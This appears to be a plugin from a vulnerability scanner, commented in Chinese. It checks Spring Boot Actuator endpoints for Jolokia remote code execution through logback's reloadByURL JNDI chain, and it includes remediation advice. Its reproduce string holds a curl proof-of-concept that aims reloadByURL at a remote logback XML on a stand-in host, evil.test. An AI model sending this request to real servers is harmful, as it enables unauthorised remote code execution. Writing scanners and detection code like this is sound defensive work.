# Spring Boot Actuator Jolokia 远程代码执行（logback JNDI 链）
# 漏洞原因：/actuator/jolokia 端点暴露 Jolokia JMX-HTTP 桥，可通过 reloadByURL MBean
#   加载远程恶意 logback XML 配置文件，触发 JNDI 注入 RCE（影响 Spring Boot + Jolokia）。
# 本插件仅做存在性验证：POST /actuator/jolokia reloadByURL 探针，检测响应特征判定接口可达。
from core.models import STATUS_CONFIRMED, STATUS_SAFE, STATUS_UNKNOWN, ScanResult
from lib.colors import no, ok
from lib.http import join_url
from lib.matcher import match_jolokia_response
from plugins.base import PluginBase

# 漏洞命中签名（与 lab/spring_server.py vuln 模式一致；仅用于对拍，非真实利用输出）
JOLOKIA_MARKER = "spring-jolokia-rce-confirmed"


class SpringJolokiaRcePlugin(PluginBase):
    name = "Spring Boot Actuator Jolokia 远程代码执行"
    cve = "N/A"
    severity = "high"
    # D12：CVSS v3.1 + 合规映射
    cvss_vector = "AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H"
    compliance = "等保2.0:8.1.3;OWASP:A03:2021"
    category = "vuln"
    description = "Jolokia JMX-HTTP 桥暴露 reloadByURL MBean，可加载远程 XML 配置触发 JNDI RCE"
    fix = "移除 jolokia 依赖或禁用 Jolokia 端点；为 /actuator/jolokia 配置认证"
    fix_detail = (
        "【移除依赖】pom.xml 删除 jolokia-core 依赖：\n"
        "  <dependency><groupId>org.jolokia</groupId><artifactId>jolokia-core</artifactId></dependency>\n"
        "【配置加固】application.yml 禁用 jolokia 端点：\n"
        "  management.endpoints.web.exposure.exclude: jolokia\n"
        "  management.endpoint.jolokia.enabled: false\n"
        "【SecurityConfig】为 jolokia 端点配置角色：\n"
        '  .antMatchers("/actuator/jolokia/**").hasRole("ADMIN")\n'
        "【JVM 加固】禁止 logback reloadByURL 加载远程配置：\n"
        "  移除 ch.qos.logback.classic.jmx.JMXConfigurator MBean 注册\n"
        "【WAF 规则】拦截外网对 /actuator/jolokia 的 POST，阻断 reloadByURL / JNDI 调用\n"
        "【合规】OWASP A03:2021 注入；等保 2.0 8.1.3 安全审计机制"
    )
    reproduce = (
        "# 1. 探测 Jolokia 端点可达性：\n"
        'curl -i "http://target/actuator/jolokia"\n'
        "\n"
        "# 2. 列出已注册 MBean（探测 reloadByURL 是否存在）：\n"
        'curl "http://target/actuator/jolokia/list" | python -m json.tool | grep -i "JMXConfigurator"\n'
        "\n"
        "# 3. reloadByURL 加载远程 logback XML 触发 JNDI RCE（PoC，请勿对未授权目标使用）：\n"
        'curl -X POST "http://target/actuator/jolokia/" \\\n'
        '  -H "Content-Type: application/json" \\\n'
        '  -d \'{"type":"EXEC","mbean":"ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator","operation":"reloadByURL","arguments":["http://evil.test/logback.xml"]}\'\n'
        "\n"
        "# 预期响应：list 返回 200 + MBean 域列表即漏洞存在"
    )

    def verify(self, target, session):
        url = join_url(target, "/actuator/jolokia")
        # reloadByURL 探针（仅触发签名，不加载远程配置）
        payload = {
            "type": "EXEC",
            "mbean": "ch.qos.logback.classic:Name=default,Type=ch.qos.logback.classic.jmx.JMXConfigurator",
            "operation": "reloadByURL",
            "arguments": ["http://jolokia-probe.test/logback.xml"],
        }
        try:
            resp = session.post(url, json=payload)
        except Exception as e:
            print(no("Spring Jolokia RCE（网络异常）"))
            return ScanResult(kind="vuln", name=self.name, status=STATUS_UNKNOWN, url=url, evidence=str(e))

        text = resp.text or ""
        if JOLOKIA_MARKER in text:
            print(ok("存在 Spring Boot Actuator Jolokia 远程代码执行漏洞"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence=f"响应含 Jolokia RCE 特征：{JOLOKIA_MARKER}",
                fix=self.fix,
            )
        # 真实漏洞响应：Jolokia EXEC 响应含 JMX MBean 特征（reloadByURL / JMXConfigurator 等）
        if resp.status_code == 200 and match_jolokia_response(text):
            print(ok("存在 Spring Boot Actuator Jolokia 远程代码执行漏洞（真实漏洞响应）"))
            return ScanResult(
                kind="vuln",
                name=self.name,
                severity=self.severity,
                status=STATUS_CONFIRMED,
                url=url,
                evidence="响应含 Jolokia JMX MBean 响应特征（reloadByURL/JMXConfigurator），证实 Jolokia 端点可达",
                fix=self.fix,
            )
        print(no("不存在 Spring Boot Actuator Jolokia 远程代码执行漏洞"))
        return ScanResult(
            kind="vuln",
            name=self.name,
            status=STATUS_SAFE,
            url=url,
            evidence="响应未含 Jolokia RCE 特征（端点不可达或已修复）",
        )
